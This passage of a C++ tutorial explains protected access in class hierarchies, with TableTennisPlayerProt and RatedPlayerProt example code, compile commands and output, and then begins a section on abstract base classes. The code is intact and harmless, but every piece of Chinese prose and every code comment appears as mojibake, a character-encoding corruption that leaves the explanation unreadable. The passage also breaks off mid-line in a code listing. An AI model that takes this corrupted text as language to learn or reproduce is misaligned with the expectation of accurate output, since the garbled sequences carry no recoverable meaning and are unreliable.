<code>protected</code> æ¥å£ï¼ˆæ–¹æ³•ï¼‰æ¥é—´æ¥ä¸åŸºç±»çš„ç§æœ‰æ•°æ®äº¤äº’ã€‚</p><p>C++ æä¾›äº†ç¬¬ä¸‰ä¸ªè®¿é—®è¯´æ˜ç¬¦ï¼š**<code>protected</code>**ã€‚</p><p><strong><code>protected</code> æˆå‘˜çš„è®¿é—®è§„åˆ™:</strong></p><ul><li>  å¯¹äº<strong>ç±»çš„å¤–éƒ¨</strong>ï¼ˆéæˆå‘˜å‡½æ•°ï¼Œéæ´¾ç”Ÿç±»ï¼‰ï¼Œ<code>protected</code> æˆå‘˜çš„è¡Œä¸ºä¸ <code>private</code> æˆå‘˜<strong>ç›¸åŒ</strong>ï¼Œå³ä¸å¯è®¿é—®ã€‚</li><li>  å¯¹äº<strong>ç±»çš„æˆå‘˜å‡½æ•°</strong>ï¼ˆä»¥åŠå‹å…ƒï¼‰ï¼Œ<code>protected</code> æˆå‘˜çš„è¡Œä¸ºä¸ <code>public</code> æˆå‘˜<strong>ç›¸åŒ</strong>ï¼Œå³å¯ç›´æ¥è®¿é—®ã€‚</li><li>  å¯¹äº<strong>æ´¾ç”Ÿç±»çš„æˆå‘˜å‡½æ•°</strong>ï¼Œ<code>protected</code> æˆå‘˜çš„è¡Œä¸ºä¹Ÿä¸ <code>public</code> æˆå‘˜<strong>ç›¸åŒ</strong>ï¼Œå³æ´¾ç”Ÿç±»<strong>å¯ä»¥</strong>ç›´æ¥è®¿é—®åŸºç±»çš„ <code>protected</code> æˆå‘˜ã€‚</li></ul><p><strong>æ€»ç»“è®¿é—®æƒé™:</strong></p><table><thead><tr><th align="left">è®¿é—®æ¥æº</th><th align="left"><code>public</code> æˆå‘˜</th><th align="left"><code>protected</code> æˆå‘˜</th><th align="left"><code>private</code> æˆå‘˜</th></tr></thead><tbody><tr><td align="left">ç±»å†…éƒ¨ (æˆå‘˜å‡½æ•°)</td><td align="left">å¯è®¿é—®</td><td align="left">å¯è®¿é—®</td><td align="left">å¯è®¿é—®</td></tr><tr><td align="left">æ´¾ç”Ÿç±» (æˆå‘˜å‡½æ•°)</td><td align="left">å¯è®¿é—®</td><td align="left"><strong>å¯è®¿é—®</strong></td><td align="left"><strong>ä¸å¯è®¿é—®</strong></td></tr><tr><td align="left">ç±»å¤–éƒ¨ (æ™®é€šä»£ç )</td><td align="left">å¯è®¿é—®</td><td align="left"><strong>ä¸å¯è®¿é—®</strong></td><td align="left"><strong>ä¸å¯è®¿é—®</strong></td></tr></tbody></table><p><strong>ç¤ºä¾‹ï¼šä¿®æ”¹ <code>TableTennisPlayer</code> ä½¿ç”¨ <code>protected</code></strong></p><p>è®©æˆ‘ä»¬ä¿®æ”¹ <code>TableTennisPlayer</code> ç±»ï¼Œå°† <code>firstname</code> å’Œ <code>lastname</code> è®¾ä¸º <code>protected</code>ï¼Œçœ‹çœ‹ <code>RatedPlayer</code> å¦‚ä½•è®¿é—®å®ƒä»¬ã€‚</p><p><strong>tabtenn_prot.h (ä½¿ç”¨ protected çš„ç‰ˆæœ¬)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TABTENN_PROT_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABTENN_PROT_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸºç±» - ä½¿ç”¨ protected æˆå‘˜</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableTennisPlayerProt</span> &#123;</span></span><br><span class="line"><span class="comment">// protected æˆå‘˜:</span></span><br><span class="line"><span class="keyword">protected</span>: <span class="comment">// æ”¹ä¸º protected</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lastname;</span><br><span class="line"><span class="keyword">private</span>:   <span class="comment">// hasTable ä»ç„¶æ˜¯ private</span></span><br><span class="line">    <span class="keyword">bool</span> hasTable;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TableTennisPlayerProt (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                           <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                           <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// Name() ä¸å†éœ€è¦ï¼Œå› ä¸ºæ´¾ç”Ÿç±»å¯ä»¥ç›´æ¥è®¿é—® protected æˆå‘˜æ¥æ„å»ºè‡ªå·±çš„ Name()</span></span><br><span class="line">    <span class="comment">// virtual void Name() const; // å¯ä»¥ç§»é™¤æˆ–ä¿ç•™</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">HasTable</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hasTable; &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetTable</span><span class="params">(<span class="keyword">bool</span> v)</span> </span>&#123; hasTable = v; &#125;;</span><br><span class="line">    <span class="keyword">virtual</span> ~TableTennisPlayerProt() &#123; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ´¾ç”Ÿç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RatedPlayerProt</span> :</span> <span class="keyword">public</span> TableTennisPlayerProt &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rating;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RatedPlayerProt (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                     <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>, <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    RatedPlayerProt(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayerProt &amp; tp);</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Rating</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rating; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRating</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r)</span> </span>&#123; rating = r; &#125;</span><br><span class="line">    <span class="comment">// æ´¾ç”Ÿç±»å¯ä»¥ç›´æ¥è®¿é—®åŸºç±»çš„ protected æˆå‘˜</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ShowInfo</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// æ–°å¢ä¸€ä¸ªæ–¹æ³•æ¥æ¼”ç¤ºè®¿é—®</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TABTENN_PROT_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>tabtenn_prot.cpp (å®ç°)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn_prot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TableTennisPlayerProt æ–¹æ³•</span></span><br><span class="line">TableTennisPlayerProt::TableTennisPlayerProt (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                              <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                              : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayerProt æ–¹æ³•</span></span><br><span class="line">RatedPlayerProt::RatedPlayerProt(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                 <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                 : TableTennisPlayerProt(fn, ln, ht), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼šè¿™ä¸ªæ„é€ å‡½æ•°ä»ç„¶éœ€è¦è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼Œ</span></span><br><span class="line"><span class="comment">// å› ä¸ºå³ä½¿ firstname/lastname æ˜¯ protectedï¼Œåˆå§‹åŒ–ä¹Ÿåº”ç”±åŸºç±»è´Ÿè´£ã€‚</span></span><br><span class="line"><span class="comment">// ä½†å¦‚æœåŸºç±»æ²¡æœ‰æä¾›åˆé€‚çš„æ„é€ å‡½æ•°ï¼Œæ´¾ç”Ÿç±»å¯ä»¥åœ¨å…¶æ„é€ å‡½æ•°ä½“ä¸­</span></span><br><span class="line"><span class="comment">// ç›´æ¥ç»™ protected æˆå‘˜èµ‹å€¼ (è™½ç„¶ä¸æ¨è)ã€‚</span></span><br><span class="line">RatedPlayerProt::RatedPlayerProt(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayerProt &amp; tp)</span><br><span class="line">                                 : TableTennisPlayerProt(tp), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ´¾ç”Ÿç±»æ–¹æ³•å¯ä»¥ç›´æ¥è®¿é—®åŸºç±»çš„ protected æˆå‘˜</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RatedPlayerProt::ShowInfo</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ç›´æ¥è®¿é—®ç»§æ‰¿æ¥çš„ protected æˆå‘˜ firstname å’Œ lastname</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; lastname &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Rating: &quot;</span> &lt;&lt; rating;</span><br><span class="line">    <span class="comment">// ä¸èƒ½ç›´æ¥è®¿é—®åŸºç±»çš„ private æˆå‘˜ hasTable</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; HasTable(); // éœ€è¦é€šè¿‡åŸºç±»çš„ public æ–¹æ³•è®¿é—®</span></span><br><span class="line">    <span class="keyword">if</span> (HasTable())</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Has Table: Yes\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Has Table: No\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ç¤ºä¾‹ (usett_prot.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn_prot.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">void</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">RatedPlayerProt <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="function">TableTennisPlayerProt <span class="title">player1</span><span class="params">(<span class="string">&quot;Tara&quot;</span>, <span class="string">&quot;Boomdea&quot;</span>, <span class="literal">false</span>)</span></span>; <span class="comment">// åŸºç±»å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rated Player Info:\n&quot;</span>;</span><br><span class="line">    rplayer1.ShowInfo(); <span class="comment">// è°ƒç”¨æ´¾ç”Ÿç±»æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è®¿é—®äº†åŸºç±»çš„ protected æˆå‘˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥è®¿é—® protected æˆå‘˜</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; rplayer1.firstname; // é”™è¯¯ï¼firstname æ˜¯ protected</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; player1.lastname;  // é”™è¯¯ï¼lastname æ˜¯ protected</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤–éƒ¨ä»£ç å¯ä»¥è®¿é—® public æˆå‘˜</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nPlayer 1 Has Table? &quot;</span> &lt;&lt; player1.HasTable() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// OK</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ usett_prot.cpp tabtenn_prot.cpp -o usett_prot</span><br><span class="line">./usett_prot</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rated Player Info:</span><br><span class="line">Name: Duck, Mallory; Rating: 1140; Has Table: Yes</span><br><span class="line"></span><br><span class="line">Player 1 Has Table? 0</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ <code>protected</code> çš„åˆ©å¼Š:</strong></p><ul><li><strong>ä¼˜ç‚¹:</strong><ul><li>  ä¸ºæ´¾ç”Ÿç±»æä¾›æ¯” <code>private</code> æ›´å¤§çš„è®¿é—®æƒé™ï¼Œå…è®¸æ´¾ç”Ÿç±»æ›´ç›´æ¥åœ°ä¸åŸºç±»å®ç°äº¤äº’ã€‚</li><li>  ç›¸æ¯” <code>public</code>ï¼Œä»ç„¶å¯¹å¤–éƒ¨ä¸–ç•Œéšè—äº†å®ç°ç»†èŠ‚ã€‚</li></ul></li><li><strong>ç¼ºç‚¹:</strong><ul><li>  <strong>ç ´åå°è£…:</strong> å°†æˆå‘˜è®¾ä¸º <code>protected</code> è€Œä¸æ˜¯ <code>private</code>ï¼Œæ„å‘³ç€åŸºç±»çš„å®ç°ç»†èŠ‚æš´éœ²ç»™äº†æ‰€æœ‰æ´¾ç”Ÿç±»ã€‚å¦‚æœå°†æ¥ä¿®æ”¹åŸºç±»çš„ <code>protected</code> æˆå‘˜ï¼Œå¯èƒ½ä¼šå½±å“æ‰€æœ‰æ´¾ç”Ÿç±»ï¼Œå¢åŠ äº†ç±»ä¹‹é—´çš„è€¦åˆåº¦ã€‚</li><li>  <strong>ç»´æŠ¤å›°éš¾:</strong> éšç€ç»§æ‰¿å±‚æ¬¡çš„åŠ æ·±ï¼Œè¿½è¸ªå“ªäº›ç±»ä¾èµ–äºç‰¹å®šçš„ <code>protected</code> æˆå‘˜ä¼šå˜å¾—å›°éš¾ã€‚</li></ul></li></ul><p><strong>è®¾è®¡å»ºè®®:</strong></p><ul><li>  ä¼˜å…ˆä½¿ç”¨ <code>private</code> æˆå‘˜ï¼Œå¹¶é€šè¿‡ <code>public</code> æˆ– <code>protected</code> <strong>æˆå‘˜å‡½æ•°</strong>æä¾›å¯¹æ•°æ®çš„è®¿é—®ï¼ˆå¦‚æœéœ€è¦ï¼‰ã€‚è¿™æä¾›äº†æ›´å¥½çš„å°è£…å’Œçµæ´»æ€§ã€‚</li><li>  åªæœ‰å½“ä½ ç¡®å®šæ´¾ç”Ÿç±»ç¡®å®éœ€è¦ç›´æ¥è®¿é—®åŸºç±»çš„æŸä¸ªå®ç°ç»†èŠ‚ï¼Œå¹¶ä¸”æä¾› <code>public/protected</code> æ¥å£ä¸æ–¹ä¾¿æˆ–æ•ˆç‡ä½ä¸‹æ—¶ï¼Œæ‰è€ƒè™‘ä½¿ç”¨ <code>protected</code> æ•°æ®æˆå‘˜ã€‚</li><li>  <code>protected</code> <strong>æˆå‘˜å‡½æ•°</strong>é€šå¸¸æ¯” <code>protected</code> <strong>æ•°æ®æˆå‘˜</strong>æ›´å—æ¬¢è¿ï¼Œå› ä¸ºå®ƒä»¬æä¾›äº†å—æ§çš„è®¿é—®æ¥å£ï¼Œè€Œä¸æ˜¯ç›´æ¥æš´éœ²æ•°æ®ã€‚</li></ul><p>æ€»ä¹‹ï¼Œ<code>protected</code> æä¾›äº†ä¸€ç§ä»‹äº <code>private</code> å’Œ <code>public</code> ä¹‹é—´çš„è®¿é—®æ§åˆ¶çº§åˆ«ï¼Œä¸»è¦ç”¨äºç®¡ç†åŸºç±»å’Œæ´¾ç”Ÿç±»ä¹‹é—´çš„è®¿é—®æƒé™ã€‚</p><h2 id="13-6-æŠ½è±¡åŸºç±»"><a href="#13-6-æŠ½è±¡åŸºç±»" class="headerlink" title="13.6 æŠ½è±¡åŸºç±»"></a>13.6 æŠ½è±¡åŸºç±»</h2><p>åœ¨è®¾è®¡ç±»å±‚æ¬¡ç»“æ„æ—¶ï¼Œæˆ‘ä»¬æœ‰æ—¶ä¼šé‡åˆ°è¿™æ ·ä¸€ç§æƒ…å†µï¼šåŸºç±»æœ¬èº«ä»£è¡¨çš„æ˜¯ä¸€ä¸ªéå¸¸<strong>æŠ½è±¡</strong>çš„æ¦‚å¿µï¼Œä»¥è‡³äºåˆ›å»ºè¯¥åŸºç±»çš„å¯¹è±¡æœ¬èº«æ²¡æœ‰æ„ä¹‰ã€‚å®ƒå­˜åœ¨çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†å®šä¹‰ä¸€ä¸ª<strong>å…±åŒçš„æ¥å£</strong>ï¼Œä¾›æ‰€æœ‰å…·ä½“çš„æ´¾ç”Ÿç±»æ¥å®ç°ã€‚è¿™ç§åªä½œä¸ºæ¥å£è§„èŒƒã€ä¸èƒ½è¢«å®ä¾‹åŒ–çš„åŸºç±»ç§°ä¸º**æŠ½è±¡åŸºç±» (Abstract Base Class, ABC)**ã€‚</p><p>ä¾‹å¦‚ï¼Œè€ƒè™‘ä¸€ä¸ªå›¾å½¢åº“ï¼Œå¯èƒ½æœ‰ä¸€ä¸ª <code>Shape</code> åŸºç±»ã€‚ä½†ä»€ä¹ˆæ˜¯â€œå½¢çŠ¶â€æœ¬èº«ï¼Ÿå®ƒå¤ªæŠ½è±¡äº†ã€‚æˆ‘ä»¬å®é™…æ“ä½œçš„æ˜¯å…·ä½“çš„å½¢çŠ¶ï¼Œå¦‚ <code>Circle</code>ï¼ˆåœ†ï¼‰ã€<code>Rectangle</code>ï¼ˆçŸ©å½¢ï¼‰ã€<code>Triangle</code>ï¼ˆä¸‰è§’å½¢ï¼‰ç­‰ã€‚åˆ›å»ºä¸€ä¸ªé€šç”¨çš„ <code>Shape</code> å¯¹è±¡å¯èƒ½æ²¡æœ‰æ„ä¹‰ï¼Œä½†æˆ‘ä»¬å¸Œæœ›æ‰€æœ‰å…·ä½“çš„å½¢çŠ¶ç±»éƒ½æä¾›æŸäº›å…±åŒçš„æ“ä½œï¼Œæ¯”å¦‚è®¡ç®—é¢ç§¯ (<code>Area()</code>) æˆ–ç»˜åˆ¶ (<code>Draw()</code>)ã€‚</p><p>C++ é€šè¿‡<strong>çº¯è™šå‡½æ•° (Pure Virtual Function)</strong> æ¥å®ç°æŠ½è±¡åŸºç±»ã€‚</p><p><strong>çº¯è™šå‡½æ•° (Pure Virtual Function):</strong></p><ul><li><p>  çº¯è™šå‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„è™šå‡½æ•°ï¼Œå®ƒåœ¨åŸºç±»ä¸­<strong>æ²¡æœ‰æä¾›å®ç°</strong>ï¼ˆæˆ–è€…è¯´ï¼Œå®ç°è¢«å»¶è¿Ÿåˆ°æ´¾ç”Ÿç±»ï¼‰ã€‚</p></li><li><p>  å®ƒç”¨äºå£°æ˜ä¸€ä¸ªæ¥å£ï¼Œå¼ºåˆ¶æ‰€æœ‰éæŠ½è±¡çš„æ´¾ç”Ÿç±»å¿…é¡»æä¾›è‡ªå·±çš„å®ç°ã€‚</p></li><li><p><strong>è¯­æ³•:</strong> åœ¨è™šå‡½æ•°å£°æ˜çš„æœ«å°¾åŠ ä¸Š <code>= 0</code>ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> ReturnType <span class="title">FunctionName</span><span class="params">(parameters)</span> <span class="keyword">const</span> </span>= <span class="number">0</span>; <span class="comment">// çº¯è™šå‡½æ•°å£°æ˜</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>æŠ½è±¡åŸºç±» (ABC) çš„å®šä¹‰:</strong></p><ul><li>  åŒ…å«<strong>è‡³å°‘ä¸€ä¸ª</strong>çº¯è™šå‡½æ•°çš„ç±»å°±æ˜¯æŠ½è±¡åŸºç±» (ABC)ã€‚</li></ul><p><strong>ABC çš„ç‰¹æ€§:</strong></p><ol><li><p><strong>ä¸èƒ½å®ä¾‹åŒ–:</strong> ä½ <strong>ä¸èƒ½</strong>åˆ›å»ºæŠ½è±¡åŸºç±»çš„å¯¹è±¡ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾ Shape æ˜¯ä¸€ä¸ª ABC</span></span><br><span class="line"><span class="comment">// Shape myShape; // é”™è¯¯ï¼ä¸èƒ½åˆ›å»º ABC çš„å¯¹è±¡</span></span><br></pre></td></tr></table></figure><p> ç¼–è¯‘å™¨ä¼šé˜»æ­¢ä½ è¿™æ ·åšï¼Œå› ä¸º ABC ä¸­çš„çº¯è™šå‡½æ•°æ²¡æœ‰å®ç°ï¼Œå¯¹è±¡æ˜¯ä¸å®Œæ•´çš„ã€‚</p></li><li><p> <strong>å¯ä»¥ä½œä¸ºæ¥å£:</strong> ABC ä¸»è¦ç”¨ä½œå®šä¹‰æ¥å£ã€‚å®ƒè§„å®šäº†æ‰€æœ‰æ´¾ç”Ÿç±»å¿…é¡»å®ç°å“ªäº›æ–¹æ³•ã€‚</p></li><li><p><strong>å¯ä»¥æœ‰æŒ‡é’ˆå’Œå¼•ç”¨:</strong> è™½ç„¶ä¸èƒ½åˆ›å»º ABC çš„å¯¹è±¡ï¼Œä½†ä½ å¯ä»¥å£°æ˜æŒ‡å‘ ABC çš„<strong>æŒ‡é’ˆ</strong>æˆ–<strong>å¼•ç”¨</strong>ã€‚è¿™äº›æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨å…¶<strong>å…·ä½“çš„æ´¾ç”Ÿç±»å¯¹è±¡</strong>ã€‚è¿™å¯¹äºå®ç°å¤šæ€è‡³å…³é‡è¦ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾ Circle æ˜¯ä» Shape æ´¾ç”Ÿçš„å…·ä½“ç±»</span></span><br><span class="line">Shape * shapePtr = <span class="keyword">new</span> Circle(<span class="number">5.0</span>); <span class="comment">// OK: åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡</span></span><br><span class="line">Shape &amp; shapeRef = *shapePtr;       <span class="comment">// OK: åŸºç±»å¼•ç”¨å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡</span></span><br></pre></td></tr></table></figure></li><li><p> <strong>æ´¾ç”Ÿç±»å¿…é¡»å®ç°çº¯è™šå‡½æ•°:</strong> ä»»ä½•ä» ABC æ´¾ç”Ÿçš„ç±»ï¼Œå¦‚æœ<strong>æ²¡æœ‰</strong>ä¸ºç»§æ‰¿æ¥çš„<strong>æ‰€æœ‰</strong>çº¯è™šå‡½æ•°æä¾›å®ç°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ´¾ç”Ÿç±»<strong>ä¹Ÿ</strong>å°†æˆä¸ºä¸€ä¸ªæŠ½è±¡åŸºç±»ï¼ŒåŒæ ·ä¸èƒ½è¢«å®ä¾‹åŒ–ã€‚åªæœ‰å½“æ´¾ç”Ÿç±»å®ç°äº†æ‰€æœ‰ç»§æ‰¿çš„çº¯è™šå‡½æ•°æ—¶ï¼Œå®ƒæ‰æˆä¸º**å…·ä½“ç±» (Concrete Class)**ï¼Œå¯ä»¥è¢«å®ä¾‹åŒ–ã€‚</p></li></ol><h3 id="13-6-1-åº”ç”¨-ABC-æ¦‚å¿µ"><a href="#13-6-1-åº”ç”¨-ABC-æ¦‚å¿µ" class="headerlink" title="13.6.1 åº”ç”¨ ABC æ¦‚å¿µ"></a>13.6.1 åº”ç”¨ ABC æ¦‚å¿µ</h3><p>è®©æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç®€å•çš„é“¶è¡Œè´¦æˆ· ABC <code>AcctABC</code>ã€‚ä¸€ä¸ªé€šç”¨çš„â€œè´¦æˆ·â€å¯èƒ½æ— æ³•ç›´æ¥æ“ä½œï¼Œä½†æ‰€æœ‰å…·ä½“çš„è´¦æˆ·ç±»å‹ï¼ˆå¦‚æ”¯ç¥¨è´¦æˆ·ã€å‚¨è“„è´¦æˆ·ï¼‰éƒ½åº”è¯¥æœ‰æŸ¥è¯¢ä½™é¢ã€å­˜æ¬¾ã€å–æ¬¾ç­‰æ“ä½œã€‚</p><p><strong>acctabc.h (ABC å®šä¹‰)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 